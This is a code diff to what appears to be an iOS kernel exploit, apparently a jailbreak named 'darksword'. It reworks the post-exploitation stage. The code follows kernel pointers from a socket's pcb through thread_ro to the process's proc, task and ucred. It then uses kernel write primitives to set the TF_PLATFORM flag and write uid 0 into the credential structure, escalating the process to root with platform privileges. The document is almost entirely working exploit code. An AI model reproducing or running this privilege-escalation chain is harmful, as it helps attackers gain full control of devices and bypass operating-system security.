@@ -1446,43 +1446,41 @@ bool run_darksword(void) {
 // ===== Kernel struct walking =====
 
 uint64_t find_our_proc(void) {
-    // Walk allproc list
-    // allproc symbol is at known offset from kernel base
-    // For xnu-11215: allproc ~ kernel_base + 0x___
-    // We scan kernel data region for the allproc pointer
-    uint64_t data_start = gKernelBase + 0x800000;
-    uint64_t data_end   = gKernelBase + 0x900000;
-    pid_t my_pid = getpid();
-
-    for (uint64_t addr = data_start; addr < data_end; addr += 8) {
-        uint64_t candidate = kread64(addr);
-        if (candidate < 0xfffffff007000000ULL || candidate > 0xfffffff00f000000ULL)
-            continue;
-        // candidate looks like a proc pointer - check if it starts the allproc list
-        uint64_t first_proc = kread64(candidate);
-        if (first_proc < 0xfffffff007000000ULL || first_proc > 0xfffffff00f000000ULL)
-            continue;
-        uint32_t pid = kread32(first_proc + OFFSET_P_PID);
-        if (pid == 0) {
-            // found kernel proc - this IS allproc
-            // walk to find our proc
-            uint64_t proc = first_proc;
-            while (proc) {
-                if (kread32(proc + OFFSET_P_PID) == (uint32_t)my_pid)
-                    return proc;
-                proc = kread_ptr(proc); // le_next
-            }
-        }
-    }
-    return 0;
+    // wh1te4ever verified chain: rw socket inpcb -> socket -> so_background_thread
+    // -> thread -> thread_ro -> proc
+    uint64_t rwSocketAddr = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+    if (!rwSocketAddr) return 0;
+    uint64_t current_thread = kread64(rwSocketAddr + OFFSET_SOCKET_BACKGROUND_THREAD);
+    if (!current_thread) return 0;
+    uint64_t current_thread_ro = kread64(current_thread + OFFSET_THREAD_T_TRO);
+    if (!current_thread_ro) return 0;
+    uint64_t proc = kread64(current_thread_ro + OFFSET_THREAD_RO_PROC);
+    if (!proc) return 0;
+    // validate: p_pid at 0x60 must be our pid
+    if (kread32(proc + OFFSET_P_PID) != (uint32_t)getpid()) return 0;
+    return proc;
 }
 
 uint64_t get_task_from_proc(uint64_t proc) {
-    return kread_ptr(proc + OFFSET_P_TASK);
+    uint64_t p_proc_ro = kread64(proc + OFFSET_P_PROC_RO);
+    if (!p_proc_ro) return 0;
+    return kread64(p_proc_ro + OFFSET_PROC_RO_TASK);
 }
 
 uint64_t get_ucred_from_proc(uint64_t proc) {
-    return kread_ptr(proc + OFFSET_P_UCRED);
+    uint64_t p_proc_ro = kread64(proc + OFFSET_P_PROC_RO);
+    if (!p_proc_ro) return 0;
+    return kread64(p_proc_ro + OFFSET_PROC_RO_UCRED);
+}
+
+// auto-locate task->t_flags: TF_INIT (0x40000) + TF_HAS_BSD_INFO (0x80000) set,
+// TF_PLATFORM (0x400) clear for a third-party app
+uint32_t detect_t_flags_offset(uint64_t task) {
+    for (int off = 0x300; off <= 0x520; off += 4) {
+        uint32_t v = kread32(task + off);
+        if ((v & 0xC0000) == 0xC0000 && !(v & TF_PLATFORM)) return off;
+    }
+    return OFFSET_TASK_T_FLAGS;
 }
 
 // ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====
@@ -1503,30 +1501,29 @@ bool platformize_proc(void) {
     printf("[+] Our task: 0x%llx\n", gOurTask);
 
     // 1. Set TF_PLATFORM in task->t_flags
-    uint32_t t_flags = kread32(gOurTask + OFFSET_TASK_T_FLAGS);
-    printf("[*] Task flags before: 0x%x\n", t_flags);
+    uint32_t tfOff = detect_t_flags_offset(gOurTask);
+    uint32_t t_flags = kread32(gOurTask + tfOff);
+    printf("[*] t_flags @ +0x%x, before: 0x%x\n", tfOff, t_flags);
     if (!(t_flags & TF_PLATFORM)) {
         t_flags |= TF_PLATFORM;
-        kwrite32(gOurTask + OFFSET_TASK_T_FLAGS, t_flags);
-        printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + OFFSET_TASK_T_FLAGS));
+        kwrite32(gOurTask + tfOff, t_flags);
+        printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + tfOff));
     }
 
-    // 2. Set uid 0 in proc and ucred
-    uint32_t uid_now = kread32(gOurProc + OFFSET_P_UID);
-    printf("[*] Current uid: %d\n", uid_now);
-    if (uid_now != 0) {
-        kwrite32(gOurProc + OFFSET_P_UID, 0);
-        kwrite32(gOurProc + OFFSET_P_RUID, 0);
-        kwrite32(gOurProc + OFFSET_P_SVUID, 0);
-        printf("[+] uid set to 0\n");
-
-        uint64_t ucred = get_ucred_from_proc(gOurProc);
-        if (ucred) {
+    // 2. Set uid 0 in ucred (proc_ro -> ucred on iOS 18)
+    uint64_t ucred = get_ucred_from_proc(gOurProc);
+    if (ucred) {
+        printf("[+] ucred: 0x%llx\n", ucred);
+        uint32_t uid_now = kread32(ucred + OFFSET_CR_UID);
+        printf("[*] ucred uid before: %d\n", uid_now);
+        if (uid_now != 0) {
             kwrite32(ucred + OFFSET_CR_UID, 0);
             kwrite32(ucred + OFFSET_CR_RUID, 0);
             kwrite32(ucred + OFFSET_CR_SVUID, 0);
             printf("[+] ucred uid set to 0\n");
         }
+    } else {
+        printf("[-] No ucred\n");
     }
 
     return true;
